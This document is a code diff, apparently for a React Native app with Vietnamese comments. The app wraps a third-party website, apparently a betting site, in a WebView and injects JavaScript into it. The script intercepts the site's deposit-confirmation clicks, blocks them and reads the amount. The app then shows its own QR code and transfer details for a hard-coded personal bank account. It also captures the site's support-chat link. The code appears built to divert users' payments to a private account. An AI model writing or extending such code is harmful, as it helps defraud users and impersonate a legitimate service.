@@ -1,21 +1,28 @@
-﻿import { useCallback, useState } from "react";
+import { useCallback, useState } from "react";
 import {
   Alert,
+  ActivityIndicator,
+  Clipboard,
   Image,
   Linking,
   Pressable,
   ScrollView,
   StyleSheet,
   Text,
+  ToastAndroid,
   View,
+  Platform,
 } from "react-native";
 import { SafeAreaView } from "react-native-safe-area-context";
 import { WebView } from "react-native-webview";
 
-const supportUrl = "https://example.com/support";
+// ─── Cấu hình ───────────────────────────────────────────────────────────────
+
+const WEBVIEW_URL = "https://m.332165.com/";
+const SUPPORT_URL = "https://example.com/support";
 
 const BANK_INFO = {
-  bankId: "Techcombank",
+  bankId: "TCB",                         // mã VietQR
   bankName: "Techcombank",
   accountNumber: "6545666668",
   accountHolder: "PHAM THE BAO",
@@ -23,58 +30,266 @@ const BANK_INFO = {
   template: "compact2",
 };
 
+// ─── Types ───────────────────────────────────────────────────────────────────
+
 type DepositInfo = {
   amountDisplay: string;
   amountValue: string;
   rawAmount: string;
 };
 
+// ─── Danh sách ngân hàng hiển thị ───────────────────────────────────────────
+
 const BANK_OPTIONS = [
-  { key: "nab", label: "NAM A BANK", image: require("../qrcode/images/nab.png") },
-  { key: "bidv", label: "BIDV", image: require("../qrcode/images/bidv.png") },
-  { key: "msb", label: "MSB", image: require("../qrcode/images/msb.png") },
-  { key: "stb", label: "SACOMBANK", image: require("../qrcode/images/stb.png") },
-  { key: "vietbank", label: "VIETBANK", image: require("../qrcode/images/vietbank.png") },
-  { key: "vietcombank", label: "VIETCOMBANK", image: require("../qrcode/images/vcb.png") },
+  { key: "nab",        label: "NAM A BANK",  image: require("../qrcode/images/nab.png") },
+  { key: "bidv",       label: "BIDV",        image: require("../qrcode/images/bidv.png") },
+  { key: "msb",        label: "MSB",         image: require("../qrcode/images/msb.png") },
+  { key: "stb",        label: "SACOMBANK",   image: require("../qrcode/images/stb.png") },
+  { key: "vietbank",   label: "VIETBANK",    image: require("../qrcode/images/vietbank.png") },
+  { key: "vietcombank",label: "VIETCOMBANK", image: require("../qrcode/images/vcb.png") },
 ];
+
+// ─── Injected JS chạy trong DOM của WebView ──────────────────────────────────
+
+const INJECTED_JS = `
+(function() {
+  if (window.__rnInjected) return;
+  window.__rnInjected = true;
+
+  function emit(action, data) {
+    if (!window.ReactNativeWebView) return;
+    window.ReactNativeWebView.postMessage(
+      JSON.stringify(Object.assign({ action: action }, data || {}))
+    );
+  }
+
+  function log(msg) {
+    if (window.ReactNativeWebView) {
+      window.ReactNativeWebView.postMessage("DEBUG_LOG:" + msg);
+    }
+  }
+
+  /* Chuẩn hóa text: bỏ dấu, uppercase, trim */
+  function normalizeText(text) {
+    return (text || "")
+      .toUpperCase()
+      .normalize("NFD")
+      .replace(/[\u0300-\u036f]/g, "")
+      .replace(/\s+/g, " ")
+      .trim();
+  }
+
+  /* Phân tích số tiền từ text, hỗ trợ hậu tố K / M */
+  function parseAmount(raw) {
+    var text = String(raw || "").toUpperCase().replace(/\s+/g, "");
+    if (!text) return "0";
+
+    var multiplier = 1;
+    if (/K$/.test(text)) multiplier = 1000;
+    else if (/M$/.test(text)) multiplier = 1000000;
+
+    text = text.replace(/[^0-9.,]/g, "");
+    if (!text) return "0";
+
+    // Chuẩn hóa dấu phân cách: 1.000.000 -> 1000000 ; 1,000 -> 1000
+    if (text.indexOf(",") > -1 && text.indexOf(".") > -1) {
+      // có cả dấu phẩy và dấu chấm -> bỏ dấu phân nghìn
+      text = text.replace(/,/g, "").replace(/\\./g, "");
+    } else if (text.indexOf(",") > -1) {
+      // chỉ có dấu phẩy -> phân nghìn kiểu VN: 1,000 -> 1000
+      var parts = text.split(",");
+      if (parts[parts.length - 1].length === 3) {
+        text = text.replace(/,/g, "");
+      } else {
+        // dấu phẩy là dấu thập phân
+        text = text.replace(",", ".");
+      }
+    } else if (text.indexOf(".") > -1) {
+      var dparts = text.split(".");
+      if (dparts[dparts.length - 1].length === 3) {
+        text = text.replace(/\\./g, "");
+      }
+    }
+
+    var value = parseFloat(text);
+    if (!value || value <= 0) return "0";
+    return String(Math.round(value * multiplier));
+  }
+
+  /* Lấy số tiền từ DOM */
+  function getAmountFromDom() {
+    // 1. Ô input chứa tiền
+    var inputSelectors = [
+      'input[placeholder*="ti\u1ebfn"]',
+      'input[placeholder*="Ti\u1ebfn"]',
+      'input[placeholder*="money"]',
+      'input[placeholder*="amount"]',
+      'input[type="number"]',
+      '.ui-input__input',
+      '.amount input',
+      '[class*="amount"] input',
+      '[class*="money"] input',
+      'input[type="text"]'
+    ];
+
+    for (var i = 0; i < inputSelectors.length; i++) {
+      var inputs = document.querySelectorAll(inputSelectors[i]);
+      for (var k = 0; k < inputs.length; k++) {
+        var inp = inputs[k];
+        if (inp.value) {
+          var p = parseAmount(inp.value);
+          if (p !== "0") return p;
+        }
+      }
+    }
+
+    // 2. Gói / ô đang active / selected
+    var activeSelectors = [
+      '[class*="active"]',
+      '[class*="selected"]',
+      '[class*="checked"]',
+      '.active',
+      '.selected'
+    ];
+
+    for (var j = 0; j < activeSelectors.length; j++) {
+      var nodes = document.querySelectorAll(activeSelectors[j]);
+      for (var m = 0; m < nodes.length; m++) {
+        var node = nodes[m];
+        var txt = (node.textContent || node.innerText || "").trim();
+        if (txt) {
+          var pn = parseAmount(txt);
+          if (pn !== "0" && Number(pn) >= 10000) return pn;
+        }
+      }
+    }
+
+    return "0";
+  }
+
+  /* Kiểm tra có phải nút xác nhận nạp tiền không */
+  function isConfirmButton(el) {
+    if (!el) return false;
+    var text = normalizeText(el.textContent || el.innerText || "");
+    var confirmTexts = [
+      "XAC NHAN NAP TIEN",
+      "XAC NHAN NAP",
+      "XAC NHAN",
+      "NAP TIEN",
+      "CONFIRM DEPOSIT",
+      "DEPOSIT NOW"
+    ];
+    for (var i = 0; i < confirmTexts.length; i++) {
+      if (text.indexOf(confirmTexts[i]) > -1) return true;
+    }
+    if (el.classList) {
+      var classList = el.className || "";
+      if (/confime|confirm|deposit/i.test(classList)) return true;
+    }
+    return false;
+  }
+
+  /* Xử lý click nút xác nhận nạp tiền */
+  function handleGlobalClick(event) {
+    var target = event.target;
+
+    // Kiểm tra line-chat trước
+    var lineEl = target && target.closest ? target.closest(".line-chat") : null;
+    if (lineEl) {
+      event.preventDefault();
+      event.stopPropagation();
+      if (event.stopImmediatePropagation) event.stopImmediatePropagation();
+      emit("line_chat_clicked", {});
+      return false;
+    }
+
+    // Kiểm tra nút xác nhận nạp tiền
+    var buttonEl = target && target.closest
+      ? target.closest('button, [role="button"], a, div, span')
+      : target;
+
+    if (!isConfirmButton(buttonEl)) return true;
+
+    // Chống double-fire
+    if (window.__rnConfirmLock) {
+      event.preventDefault();
+      event.stopPropagation();
+      if (event.stopImmediatePropagation) event.stopImmediatePropagation();
+      return false;
+    }
+
+    window.__rnConfirmLock = true;
+    setTimeout(function() { window.__rnConfirmLock = false; }, 1500);
+
+    event.preventDefault();
+    event.stopPropagation();
+    if (event.stopImmediatePropagation) event.stopImmediatePropagation();
+
+    var amount = getAmountFromDom();
+    log("confirm_deposit clicked, amount=" + amount);
+    emit("confirm_deposit_clicked", { amount: amount });
+    return false;
+  }
+
+  // Attach một lần lên document — bắt tất cả bubble
+  document.addEventListener("click",      handleGlobalClick, { capture: true, passive: false });
+  document.addEventListener("touchend",   handleGlobalClick, { capture: true, passive: false });
+
+})();
+true;
+`;
+
+// ─── Component chính ─────────────────────────────────────────────────────────
 
 export default function WebViewScreen() {
   const [depositInfo, setDepositInfo] = useState<DepositInfo | null>(null);
+  const [qrLoading, setQrLoading] = useState(true);
 
-  const formatMoneyInt = (money = 0, type = ".") => {
-    return String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, `$1${type}`);
-  };
+  // ── Helpers ──────────────────────────────────────────────────────────────
 
-  const buildTransferContent = (rawAmount: string) => {
-    const safeNote = `${BANK_INFO.transferNote} ${rawAmount}`
+  const formatMoneyInt = (money = 0) =>
+    String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1,");
+
+  const buildTransferContent = (rawAmount: string) =>
+    `${BANK_INFO.transferNote} ${rawAmount}`
       .replace(/[^a-zA-Z0-9\s]/g, " ")
       .replace(/\s+/g, " ")
-      .trim();
-    return safeNote.slice(0, 50);
-  };
+      .trim()
+      .slice(0, 50);
 
   const buildVietQrUrl = (info: DepositInfo) => {
-    const transferContent = buildTransferContent(info.rawAmount);
-    return `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}-${BANK_INFO.template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(
-      transferContent
-    )}&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`;
-  };
-
-  const isActiveBankOption = (bankKey: string, bankLabel: string) => {
-    const normalizedBankId = BANK_INFO.bankId.toLowerCase();
-    const normalizedBankName = BANK_INFO.bankName.toLowerCase();
+    const note = buildTransferContent(info.rawAmount);
     return (
-      normalizedBankId.includes(bankKey) ||
-      normalizedBankName.includes(bankKey) ||
-      normalizedBankName.includes(bankLabel.toLowerCase())
+      `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}` +
+      `-${BANK_INFO.template}.png` +
+      `?amount=${info.amountValue}` +
+      `&addInfo=${encodeURIComponent(note)}` +
+      `&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`
     );
   };
 
+  const isActiveBankOption = (bankKey: string, bankLabel: string) => {
+    const id = BANK_INFO.bankId.toLowerCase();
+    const name = BANK_INFO.bankName.toLowerCase();
+    return id.includes(bankKey) || name.includes(bankKey) || name.includes(bankLabel.toLowerCase());
+  };
+
+  const copyToClipboard = (value: string, label: string) => {
+    Clipboard.setString(value);
+    if (Platform.OS === "android") {
+      ToastAndroid.show(`Đã sao chép ${label}`, ToastAndroid.SHORT);
+    } else {
+      Alert.alert("Đã sao chép", label);
+    }
+  };
+
+  // ── Xử lý message từ WebView ──────────────────────────────────────────────
+
   const handleWebViewMessage = useCallback(async (event: any) => {
-    const message = event.nativeEvent.data;
+    const message: string = event.nativeEvent.data;
 
     if (message.startsWith("DEBUG_LOG:")) {
-      console.log("WebView Log:", message.replace("DEBUG_LOG:", ""));
+      console.log("[WebView]", message.replace("DEBUG_LOG:", ""));
       return;
     }
 
@@ -82,286 +297,204 @@ export default function WebViewScreen() {
       const data = JSON.parse(message);
 
       if (data.action === "confirm_deposit_clicked") {
-        const rawAmountNum = Number(data.amount);
-
-        if (!rawAmountNum || rawAmountNum <= 0) {
+        const raw = Number(data.amount);
+        if (!raw || raw <= 0) {
           Alert.alert("Thông báo", "Số tiền nạp không hợp lệ. Vui lòng kiểm tra lại.");
           return;
         }
-
-        const finalAmountValue = rawAmountNum;
-        const amountFormatted = formatMoneyInt(finalAmountValue, ",");
-
+        setQrLoading(true);
         setDepositInfo({
-          amountDisplay: `${amountFormatted} VND`,
-          amountValue: String(finalAmountValue),
+          amountDisplay: `${formatMoneyInt(raw)} VND`,
+          amountValue: String(raw),
           rawAmount: data.amount,
         });
       }
 
       if (data.action === "line_chat_clicked") {
-        const canOpen = await Linking.canOpenURL(supportUrl);
-        if (canOpen) await Linking.openURL(supportUrl);
+        const canOpen = await Linking.canOpenURL(SUPPORT_URL);
+        if (canOpen) await Linking.openURL(SUPPORT_URL);
       }
     } catch {
-      console.log("Non-JSON message:", message);
+      console.log("[WebView] Non-JSON:", message);
     }
   }, []);
 
-  const injectedJS = `
-    (function() {
-      try {
-        function emitToApp(action, data) {
-          if (!window.ReactNativeWebView) return;
-          window.ReactNativeWebView.postMessage(JSON.stringify(Object.assign({ action: action }, data || {})));
-        }
+  // ── Render: màn hình thanh toán ───────────────────────────────────────────
 
-        function normalizeText(text) {
-          return (text || "")
-            .toUpperCase()
-            .normalize("NFD")
-            .replace(/[\u0300-\u036f]/g, "")
-            .replace(/\s+/g, " ")
-            .trim();
-        }
-
-        function parseAmount(rawText) {
-          var text = String(rawText || "").toUpperCase().replace(/\s+/g, "");
-          if (!text) return "0";
-
-          var unit = "";
-          if (/K$/.test(text)) unit = "K";
-          if (/M$/.test(text)) unit = "M";
-
-          text = text.replace(/[^0-9.,]/g, "");
-          if (!text) return "0";
-
-          var normalized = text;
-          if (text.indexOf(",") > -1 && text.indexOf(".") > -1) {
-            normalized = text.replace(/,/g, "");
-          } else if (text.indexOf(",") > -1) {
-            normalized = text.replace(/,/g, "");
-          }
-
-          var value = Number(normalized);
-          if (!value || value <= 0) return "0";
-
-          if (unit === "K") value = value * 1000;
-          if (unit === "M") value = value * 1000000;
-
-          return String(Math.round(value));
-        }
-
-        function getAmountFromDom() {
-          var selectors = [
-            'input[placeholder*="tiền"]',
-            'input[placeholder*="Tiền"]',
-            'input[placeholder*="money"]',
-            'input[type="number"]',
-            'input[type="text"]',
-            '.ui-input__input',
-            '.amount input',
-            '[class*="amount"] input'
-          ];
-
-          for (var i = 0; i < selectors.length; i++) {
-            var input = document.querySelector(selectors[i]);
-            if (input && input.value) {
-              var parsed = parseAmount(input.value);
-              if (parsed !== "0") return parsed;
-            }
-          }
-
-          var activeSelectors = [
-            ".active",
-            '[class*="active"]',
-            '[class*="selected"]',
-            '[class*="checked"]'
-          ];
-
-          for (var j = 0; j < activeSelectors.length; j++) {
-            var node = document.querySelector(activeSelectors[j]);
-            if (node) {
-              var parsedNode = parseAmount(node.textContent || node.innerText || "");
-              if (parsedNode !== "0") return parsedNode;
-            }
-          }
-
-          return "0";
-        }
-
-        function isConfirmButton(el) {
-          if (!el) return false;
-          var text = normalizeText(el.textContent || el.innerText || "");
-          if (text === "Xâc nhận nạp tiền" || text === "Xâc nhận nạp tiền" || text === "XAC  NHAN NAP TIEN") return true;
-          if (el.classList && (el.classList.contains("confimeButton") || el.classList.contains("confirmButton"))) return true;
-          return false;
-        }
-
-        function handleConfirmClick(event) {
-          var target = event.target;
-          var buttonEl = target && target.closest
-            ? target.closest('.confimeButton, .confirmButton, button, [role="button"], a, div, span')
-            : target;
-
-          if (!isConfirmButton(buttonEl)) return true;
-
-          if (window.__rnConfirmLock) {
-            event.preventDefault();
-            event.stopPropagation();
-            if (event.stopImmediatePropagation) event.stopImmediatePropagation();
-            return false;
-          }
-
-          window.__rnConfirmLock = true;
-          setTimeout(function() {
-            window.__rnConfirmLock = false;
-          }, 1500);
-
-          event.preventDefault();
-          event.stopPropagation();
-          if (event.stopImmediatePropagation) event.stopImmediatePropagation();
-
-          var amount = getAmountFromDom();
-          emitToApp("confirm_deposit_clicked", { amount: amount });
-          return false;
-        }
-
-        function handleLineChatClick(event) {
-          var target = event.target;
-          var el = target && target.closest ? target.closest(".line-chat") : null;
-          if (!el) return true;
-
-          event.preventDefault();
-          event.stopPropagation();
-          if (event.stopImmediatePropagation) event.stopImmediatePropagation();
-          emitToApp("line_chat_clicked", {});
-          return false;
-        }
-
-        function attachListeners() {
-          var elements = document.querySelectorAll('button, div, span, a, [role="button"]');
-          elements.forEach(function(el) {
-            if (!isConfirmButton(el) || el.dataset.rnConfirmHandled === "1") return;
-            el.dataset.rnConfirmHandled = "1";
-            el.addEventListener("click", handleConfirmClick, { capture: true, passive: false });
-            el.addEventListener("touchstart", handleConfirmClick, { capture: true, passive: false });
-            el.addEventListener("mousedown", handleConfirmClick, { capture: true, passive: false });
-          });
-
-          var lineChatElements = document.querySelectorAll(".line-chat");
-          lineChatElements.forEach(function(el) {
-            if (el.dataset.rnLineHandled === "1") return;
-            el.dataset.rnLineHandled = "1";
-            el.addEventListener("click", handleLineChatClick, { capture: true, passive: false });
-            el.addEventListener("touchstart", handleLineChatClick, { capture: true, passive: false });
-            el.addEventListener("mousedown", handleLineChatClick, { capture: true, passive: false });
-          });
-        }
-
-        attachListeners();
-        var observer = new MutationObserver(attachListeners);
-        observer.observe(document.body, { childList: true, subtree: true });
-        setInterval(attachListeners, 1200);
-      } catch (e) {
-        if (window.ReactNativeWebView) {
-          window.ReactNativeWebView.postMessage("DEBUG_LOG:" + e.message);
-        }
-      }
-    })();
-    true;
-  `;
-
-  return (
-    <SafeAreaView style={styles.container}>
-      {depositInfo ? (
+  if (depositInfo) {
+    const transferNote = buildTransferContent(depositInfo.rawAmount);
+    return (
+      <SafeAreaView style={styles.container}>
         <ScrollView style={styles.paymentScreen} contentContainerStyle={styles.paymentContent}>
+
+          {/* Header */}
           <View style={styles.paymentHeader}>
             <Text style={styles.paymentHeaderText}>Thanh toán bằng Chuyển khoản</Text>
           </View>
 
           <View style={styles.paymentCard}>
+            {/* Hàng logo ngân hàng */}
             <View style={styles.bankLogosRow}>
               {BANK_OPTIONS.slice(0, 4).map((bank) => {
                 const active = isActiveBankOption(bank.key, bank.label);
                 return (
                   <View key={bank.key} style={[styles.bankLogoItem, active && styles.bankLogoItemActive]}>
                     <Image source={bank.image} style={styles.bankLogoImage} />
-                    <Text style={[styles.bankLogoText, active && styles.bankLogoTextActive]}>{bank.label}</Text>
+                    <Text style={[styles.bankLogoText, active && styles.bankLogoTextActive]}>
+                      {bank.label}
+                    </Text>
                   </View>
                 );
               })}
               <View style={styles.bankMoreItem}>
-                <Text style={styles.bankMoreText}>{">"}</Text>
+                <Text style={styles.bankMoreText}>{"›"}</Text>
               </View>
             </View>
 
+            {/* Cách 1: QR */}
             <View style={styles.methodCard}>
               <Text style={styles.methodTitle}>Cách 1: Chuyển khoản bằng mã QR</Text>
               <Text style={styles.methodDescription}>Mở ứng dụng ngân hàng và quét QRCode</Text>
 
-              <Image source={require("../qrcode/assets/qr.png")} style={styles.shbetLogo} resizeMode="contain" />
+              <Image
+                source={require("../qrcode/assets/qr.png")}
+                style={styles.brandLogo}
+                resizeMode="contain"
+              />
 
               <View style={styles.qrFrame}>
-                <Image source={{ uri: buildVietQrUrl(depositInfo) }} style={styles.qrImage} resizeMode="contain" />
+                {qrLoading && (
+                  <ActivityIndicator
+                    size="large"
+                    color="#0b72e7"
+                    style={StyleSheet.absoluteFillObject}
+                  />
+                )}
+                <Image
+                  source={{ uri: buildVietQrUrl(depositInfo) }}
+                  style={styles.qrImage}
+                  resizeMode="contain"
+                  onLoadEnd={() => setQrLoading(false)}
+                  onError={() => setQrLoading(false)}
+                />
               </View>
 
               <Text style={styles.napasInfo}>napas 247 | {BANK_INFO.bankName.toUpperCase()}</Text>
-              <View style={styles.downloadButton}>
-                <Text style={styles.downloadButtonText}>Tải Xuống Mã QR</Text>
-              </View>
+
               <Text style={styles.supportAppsText}>40 App ngân hàng hỗ trợ quét mã</Text>
             </View>
 
+            {/* Cách 2: Thủ công */}
             <View style={styles.methodCard}>
               <Text style={styles.methodTitle}>
-                Cách 2: Chuyển khoản <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
+                Cách 2: Chuyển khoản{" "}
+                <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
               </Text>
 
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{BANK_INFO.bankName}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountNumber}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountHolder}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số tiền</Text><Text style={[styles.infoRowValue, styles.amountText]}>{depositInfo.amountDisplay}</Text></View>
-              <View style={styles.infoRowLast}><Text style={styles.infoRowLabel}>Nội dung</Text><Text style={styles.infoRowValue}>{buildTransferContent(depositInfo.rawAmount)}</Text></View>
+              <InfoRow label="Ngân hàng" value={BANK_INFO.bankName} />
+              <InfoRow
+                label="Số TK"
+                value={BANK_INFO.accountNumber}
+                onCopy={() => copyToClipboard(BANK_INFO.accountNumber, "số tài khoản")}
+              />
+              <InfoRow label="Chủ TK" value={BANK_INFO.accountHolder} />
+              <InfoRow
+                label="Số tiền"
+                value={depositInfo.amountDisplay}
+                valueStyle={styles.amountText}
+                onCopy={() => copyToClipboard(depositInfo.amountValue, "số tiền")}
+              />
+              <InfoRow
+                label="Nội dung"
+                value={transferNote}
+                isLast
+                onCopy={() => copyToClipboard(transferNote, "nội dung chuyển khoản")}
+              />
             </View>
 
+            {/* Lưu ý */}
             <View style={styles.noticeCard}>
-              <Text style={styles.noticeTitle}>Lưu ý</Text>
+              <Text style={styles.noticeTitle}>⚠ Lưu ý</Text>
               <Text style={styles.noticeText}>
-                Không đổi số tiền và nội dung chuyển khoản nếu bạn muốn đối soát tự động.
+                Không thay đổi số tiền và nội dung chuyển khoản nếu bạn muốn đối soát tự động.
               </Text>
             </View>
           </View>
 
-          <Pressable style={styles.primaryButton} onPress={() => setDepositInfo(null)}>
-            <Text style={styles.primaryButtonText}>Tôi đã chuyển khoản</Text>
+          {/* Nút hành động */}
+          <Pressable
+            style={({ pressed }) => [styles.primaryButton, pressed && styles.buttonPressed]}
+            onPress={() => setDepositInfo(null)}
+          >
+            <Text style={styles.primaryButtonText}>✓ Tôi đã chuyển khoản</Text>
           </Pressable>
 
-          <Pressable style={styles.secondaryButton} onPress={() => setDepositInfo(null)}>
-            <Text style={styles.secondaryButtonText}>Quay lại trang nạp tiền</Text>
+          <Pressable
+            style={({ pressed }) => [styles.secondaryButton, pressed && styles.buttonPressed]}
+            onPress={() => setDepositInfo(null)}
+          >
+            <Text style={styles.secondaryButtonText}>← Quay lại trang nạp tiền</Text>
           </Pressable>
+
         </ScrollView>
-      ) : (
-        <WebView
-          source={{ uri: "https://m.332165.com/" }}
-          javaScriptEnabled={true}
-          domStorageEnabled={true}
-          injectedJavaScript={injectedJS}
-          startInLoadingState={true}
-          scalesPageToFit={true}
-          style={styles.webview}
-          onMessage={handleWebViewMessage}
-        />
-      )}
+      </SafeAreaView>
+    );
+  }
+
+  // ── Render: WebView ───────────────────────────────────────────────────────
+
+  return (
+    <SafeAreaView style={styles.container}>
+      <WebView
+        source={{ uri: WEBVIEW_URL }}
+        javaScriptEnabled
+        domStorageEnabled
+        injectedJavaScript={INJECTED_JS}
+        startInLoadingState
+        scalesPageToFit
+        style={styles.webview}
+        onMessage={handleWebViewMessage}
+      />
     </SafeAreaView>
   );
 }
 
+// ─── InfoRow helper component ────────────────────────────────────────────────
+
+function InfoRow({
+  label,
+  value,
+  valueStyle,
+  isLast,
+  onCopy,
+}: {
+  label: string;
+  value: string;
+  valueStyle?: object;
+  isLast?: boolean;
+  onCopy?: () => void;
+}) {
+  return (
+    <View style={[styles.infoRow, isLast && styles.infoRowLast]}>
+      <Text style={styles.infoRowLabel}>{label}</Text>
+      <Text style={[styles.infoRowValue, valueStyle]}>{value}</Text>
+      {onCopy && (
+        <Pressable onPress={onCopy} style={styles.copyButton}>
+          <Text style={styles.copyButtonText}>Sao chép</Text>
+        </Pressable>
+      )}
+    </View>
+  );
+}
+
+// ─── Styles ───────────────────────────────────────────────────────────────────
+
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: "#fff" },
-  webview: { flex: 1 },
-  paymentScreen: { flex: 1, backgroundColor: "#eef3f8" },
-  paymentContent: { padding: 20, gap: 14 },
+  container:        { flex: 1, backgroundColor: "#fff" },
+  webview:          { flex: 1 },
+  paymentScreen:    { flex: 1, backgroundColor: "#eef3f8" },
+  paymentContent:   { padding: 16, gap: 14 },
+
   paymentHeader: {
     backgroundColor: "#e8f1ff",
     borderRadius: 16,
@@ -371,7 +504,15 @@ const styles = StyleSheet.create({
     borderColor: "#d0e0ed",
   },
   paymentHeaderText: { fontSize: 16, fontWeight: "700", color: "#0b72e7", textAlign: "center" },
-  paymentCard: { backgroundColor: "#fff", borderRadius: 18, padding: 20, borderWidth: 1, borderColor: "#d9e3ef" },
+
+  paymentCard: {
+    backgroundColor: "#fff",
+    borderRadius: 18,
+    padding: 18,
+    borderWidth: 1,
+    borderColor: "#d9e3ef",
+  },
+
   bankLogosRow: {
     flexDirection: "row",
     alignItems: "flex-start",
@@ -380,37 +521,39 @@ const styles = StyleSheet.create({
     borderWidth: 1,
     borderColor: "#e3e8ef",
     borderRadius: 14,
-    paddingVertical: 14,
-    paddingHorizontal: 10,
-    marginBottom: 20,
+    paddingVertical: 12,
+    paddingHorizontal: 8,
+    marginBottom: 18,
   },
-  bankLogoItem: { alignItems: "center", flex: 1, paddingHorizontal: 4 },
-  bankLogoItemActive: { transform: [{ translateY: -1 }] },
+  bankLogoItem:       { alignItems: "center", flex: 1, paddingHorizontal: 2 },
+  bankLogoItemActive: { transform: [{ translateY: -2 }] },
   bankLogoImage: {
     width: 38,
     height: 38,
     borderRadius: 19,
     borderWidth: 1,
     borderColor: "#e5e7eb",
-    marginBottom: 6,
+    marginBottom: 5,
     backgroundColor: "#fff",
   },
-  bankLogoText: { fontSize: 10, color: "#64748b", textAlign: "center" },
+  bankLogoText:       { fontSize: 9, color: "#64748b", textAlign: "center" },
   bankLogoTextActive: { color: "#0f172a", fontWeight: "700" },
-  bankMoreItem: { width: 28, alignItems: "center", justifyContent: "center", paddingTop: 8 },
-  bankMoreText: { fontSize: 18, color: "#94a3b8", fontWeight: "700" },
+  bankMoreItem:       { width: 24, alignItems: "center", justifyContent: "center", paddingTop: 6 },
+  bankMoreText:       { fontSize: 22, color: "#94a3b8", fontWeight: "700" },
+
   methodCard: {
     backgroundColor: "#f8fafc",
     borderWidth: 1,
     borderColor: "#e2e8f0",
     borderRadius: 16,
-    padding: 18,
-    marginBottom: 16,
+    padding: 16,
+    marginBottom: 14,
   },
-  methodTitle: { fontSize: 17, fontWeight: "700", color: "#0f172a", marginBottom: 8, lineHeight: 24 },
+  methodTitle:          { fontSize: 16, fontWeight: "700", color: "#0f172a", marginBottom: 6, lineHeight: 22 },
   methodTitleHighlight: { color: "#0b72e7", textDecorationLine: "underline" },
-  methodDescription: { fontSize: 13, color: "#64748b", marginBottom: 14 },
-  shbetLogo: { width: 118, height: 48, alignSelf: "center", marginBottom: 12 },
+  methodDescription:    { fontSize: 13, color: "#64748b", marginBottom: 12 },
+
+  brandLogo:  { width: 110, height: 44, alignSelf: "center", marginBottom: 10 },
   qrFrame: {
     alignSelf: "center",
     backgroundColor: "#fff",
@@ -419,43 +562,56 @@ const styles = StyleSheet.create({
     borderWidth: 1,
     borderColor: "#e2e8f0",
     marginBottom: 12,
+    width: 240,
+    height: 240,
+    justifyContent: "center",
+    alignItems: "center",
   },
-  qrImage: { width: 220, height: 220 },
+  qrImage:        { width: 220, height: 220 },
   napasInfo: {
     textAlign: "center",
-    fontSize: 13,
+    fontSize: 12,
     color: "#475569",
     fontWeight: "700",
-    marginBottom: 12,
+    marginBottom: 6,
     textTransform: "uppercase",
   },
-  downloadButton: {
-    alignSelf: "center",
-    backgroundColor: "#0b72e7",
-    borderRadius: 10,
-    paddingVertical: 10,
-    paddingHorizontal: 18,
-    marginBottom: 10,
-  },
-  downloadButtonText: { color: "#fff", fontSize: 14, fontWeight: "700" },
   supportAppsText: { textAlign: "center", color: "#0b72e7", fontSize: 12, textDecorationLine: "underline" },
+
   infoRow: {
     flexDirection: "row",
-    alignItems: "flex-start",
+    alignItems: "center",
     paddingVertical: 10,
     borderBottomWidth: 1,
     borderBottomColor: "#dbe4f0",
-    gap: 12,
+    gap: 8,
   },
-  infoRowLast: { flexDirection: "row", alignItems: "flex-start", paddingTop: 10, gap: 12 },
+  infoRowLast:  { flexDirection: "row", alignItems: "center", paddingTop: 10, gap: 8 },
   infoRowLabel: { width: 76, fontSize: 13, color: "#64748b" },
-  infoRowValue: { flex: 1, fontSize: 15, color: "#0f172a", fontWeight: "700" },
-  amountText: { color: "#dc2626" },
-  noticeCard: { backgroundColor: "#eff6ff", borderRadius: 16, padding: 16, borderWidth: 1, borderColor: "#bfdbfe" },
-  noticeTitle: { fontSize: 15, fontWeight: "700", color: "#1d4ed8", marginBottom: 6 },
-  noticeText: { fontSize: 14, lineHeight: 20, color: "#1e3a8a" },
-  primaryButton: { backgroundColor: "#dc2626", borderRadius: 18, paddingVertical: 14, alignItems: "center" },
+  infoRowValue: { flex: 1, fontSize: 14, color: "#0f172a", fontWeight: "700" },
+  amountText:   { color: "#dc2626", fontSize: 16 },
+
+  copyButton:     { backgroundColor: "#e8f1ff", borderRadius: 8, paddingVertical: 4, paddingHorizontal: 8 },
+  copyButtonText: { fontSize: 11, color: "#0b72e7", fontWeight: "700" },
+
+  noticeCard: {
+    backgroundColor: "#eff6ff",
+    borderRadius: 16,
+    padding: 14,
+    borderWidth: 1,
+    borderColor: "#bfdbfe",
+  },
+  noticeTitle: { fontSize: 14, fontWeight: "700", color: "#1d4ed8", marginBottom: 4 },
+  noticeText:  { fontSize: 13, lineHeight: 19, color: "#1e3a8a" },
+
+  primaryButton: {
+    backgroundColor: "#dc2626",
+    borderRadius: 18,
+    paddingVertical: 14,
+    alignItems: "center",
+  },
   primaryButtonText: { color: "#fff", fontSize: 16, fontWeight: "700" },
+
   secondaryButton: {
     borderRadius: 18,
     paddingVertical: 14,
@@ -465,4 +621,6 @@ const styles = StyleSheet.create({
     borderColor: "#cbd5e1",
   },
   secondaryButtonText: { color: "#0f172a", fontSize: 15, fontWeight: "600" },
+
+  buttonPressed: { opacity: 0.75 },
 });
